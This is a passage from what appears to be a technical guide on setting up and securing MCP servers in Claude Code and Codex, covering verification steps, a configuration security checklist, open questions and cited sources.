- Claude Code asks once per `.mcp.json` server interactively, but loads them without asking in `-p`, SDK and cloud runs. Codex loads project servers only after project trust; `trust_level = "untrusted"` turns project-local config off ([Claude Code plugin security](https://code.claude.com/docs/en/plugins/security); [Codex security](https://learn.chatgpt.com/docs/agent-approvals-security)).
- Review configuration changes "with the same rigor applied to source code" ([Check Point](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)).

## Verification

- **Status and context cost:** Claude Code `/mcp` for status, `/context all` for tokens per loaded tool. Codex `/mcp` and the session token display.
- **CLI vs MCP decision:** run the same task with and without the server; compare tokens and success.
- **Server quality:** run a held-out eval set in Claude Code and Codex; compare success, tool calls and tokens. Confirm tool search finds each tool from a natural-language request.
- **Output size:** check the largest outputs against the 10k-token warning and the 25k default in Claude Code.
- **Rug pulls:** diff `tools/list` output between versions.
- **Admin allowlist:** add an unlisted server with `claude mcp add` or `codex mcp add` and confirm it is refused or disabled.
- **Trust gate:** open the repository untrusted and confirm with `ps` that no MCP process starts.
- **Headless CI:** fail a run on `mcp_server_errors` in the Claude Code `system/init` event (see [automation](./automation.md)).

## Checklist

- [ ] Each server has a reason a CLI plus skill would not do (auth, state, no CLI, no shell).
- [ ] Each server has a companion skill.
- [ ] Only needed tools are enabled (`enabled_tools` / bare `deny` rules / `permission` deny).
- [ ] Outbound and write tools need approval; no auto-approved writes on servers that read untrusted content.
- [ ] Commands pin versions; no bare `npx -y` / `uvx`.
- [ ] No secrets in `.mcp.json`, `config.toml` or `opencode.json`; secrets come from environment variables or OAuth.
- [ ] Credential-bearing servers are in local or user scope, not project scope.
- [ ] Admin allowlist matches by command or URL; `disableSideloadFlags` is paired with `allowedMcpServers`.
- [ ] `enableAllProjectMcpServers` is not committed.
- [ ] Output limits are set; large-output tools paginate.
- [ ] Same server name in every harness.
- [ ] For own servers: workflow-level tools, examples in descriptions, `isError` messages, instructions under 512 characters, both approval hints, stdio or streamable HTTP only.
- [ ] Third-party servers were reviewed (source, `tools/list`, publisher, scopes) and are re-reviewed on update.

## Open questions

- The fetched Codex user docs do not describe tool search; only the PR does. No documented Codex equivalent of `alwaysLoad`.
- No controlled study after deferred loading compares MCP and CLI across many tasks; Checkly is one task.
- Codex's default `output_token_limit` is not documented on the fetched pages.
- No vendor guidance quantifies the ideal number of tools per server beyond "few" and the tool-search thresholds.
- No Codex-specific tool-design guidance beyond the 512-character instructions rule.
- Not re-verified whether Claude Code reads `readOnlyHint` / `destructiveHint` annotations for approval.
- Neither lead documents rug-pull detection (alerting on description changes after approval). Treat it as absent.
- No MCPTox-style attack-success data for 2026 Claude or GPT-5-class models.
- Codex does not document whether a server defined in user and project config is replaced or merged per key ([MCP concept page](../concepts/mcp.md)).

## Protocol revision and security checks

[Specification] These references use MCP 2026-07-28, the
[current revision](https://modelcontextprotocol.io/docs/2026-07-28/learn/versioning).
They do not establish which revision a deployed harness negotiates.
For HTTP, validate present Origin (invalid values receive 403); local
binding and authentication add protection
([transport](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)).
Authorization also needs resource/audience binding, PKCE, response-issuer
checks and per-client consent; discovery needs SSRF defenses
([authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization),
[security considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations),
[security guidance](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)).

The [security guide](../guide/security.md#mcp-authorization-and-transport)
connects those requirements to deployment checks and historical SDK
advisories. Do not conflate current application state handles with
legacy protocol sessions.

## Sources

- [Claude Code best practices](https://code.claude.com/docs/en/best-practices)
- [Extend Claude Code](https://code.claude.com/docs/en/features-overview)
- [Claude Code MCP](https://code.claude.com/docs/en/mcp)
- [Claude Code plugins for orgs](https://code.claude.com/docs/en/plugins/org)
- [Claude Code plugin security](https://code.claude.com/docs/en/plugins/security)
- [Codex MCP (learn.chatgpt.com)](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)
- [Codex MCP (developers.openai.com)](https://developers.openai.com/codex/mcp)
- [Codex agent approvals and security](https://learn.chatgpt.com/docs/agent-approvals-security)
- [Codex managed configuration](https://developers.openai.com/codex/enterprise/managed-configuration)
- [openai/codex PR #29486](https://github.com/openai/codex/pull/29486)
- [Anthropic, Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents)
- [Anthropic, Advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)
- [Anthropic, Code execution with MCP](https://www.anthropic.com/engineering/code-execution-with-mcp)
- [Cloudflare Code Mode](https://blog.cloudflare.com/code-mode/)
- [MCP spec, Tools (2026-07-28)](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)
- [MCP Security Best Practices (2026-07-28)](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- [Zechner, MCP vs CLI](https://mariozechner.at/posts/2025-08-15-mcp-vs-cli/)
- [Zechner, What if you don't need MCP at all?](https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/)
- [Willison, Claude Skills](https://simonwillison.net/2025/Oct/16/claude-skills/)
- [Willison, lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)
- [Willison, MCP prompt injection](https://simonwillison.net/2025/Apr/9/mcp-prompt-injection/)
- [Checkly, MCP vs CLI token efficiency](https://www.checklyhq.com/blog/mcp-vs-cli-token-efficiency/)
- [Invariant Labs, tool poisoning](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
- [Invariant Labs, GitHub MCP](https://invariantlabs.ai/blog/mcp-github-vulnerability)
- [MCPTox, arXiv 2508.14925](https://arxiv.org/html/2508.14925v1)
- [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/)
- [OWASP MCP04](https://owasp.org/www-project-mcp-top-10/2025/MCP04-2025%E2%80%93Software-Supply-Chain-Attacks%26Dependency-Tampering)
- [GitLab advisory CVE-2025-6514](https://advisories.gitlab.com/npm/mcp-remote/CVE-2025-6514/)
- [SentinelOne CVE-2025-49596](https://www.sentinelone.com/vulnerability-database/cve-2025-49596/)
- [GitLab advisory CVE-2025-58444](https://advisories.gitlab.com/npm/@modelcontextprotocol/inspector/CVE-2025-58444/)
- [Postmark, unofficial malicious connector](https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package)
- [Check Point Research, Claude Code project files](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [Check Point Research, Codex CLI](https://research.checkpoint.com/2025/openai-codex-cli-command-injection-vulnerability/)
- [NVD CVE-2025-61260](https://nvd.nist.gov/vuln/detail/cve-2025-61260)
- Repo: [MCP concept page](../concepts/mcp.md), [concept index](../concepts/README.md)
